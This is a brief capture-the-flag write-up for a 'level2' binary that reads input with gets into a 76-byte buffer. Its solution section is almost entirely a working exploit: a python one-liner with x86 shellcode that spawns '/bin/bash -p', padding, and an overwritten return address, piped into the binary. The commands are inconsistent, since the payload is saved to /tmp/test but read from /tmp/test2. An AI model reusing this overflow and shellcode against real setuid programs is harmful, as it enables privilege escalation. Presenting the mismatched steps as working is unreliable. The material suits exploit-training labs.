## LEVEL 2 HELP

the level2 binary make a gets call to get user input on a buffer of 76 bytes.

### USAGE

```bash
./level2
[input]
```

then we need to overflow the buffer to overwrite the return address to our shellcode

## SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "a" * 47 + "\x08\xa0\x04\x08")' > /tmp/test

cat /tmp/test2 - | ./level2
```
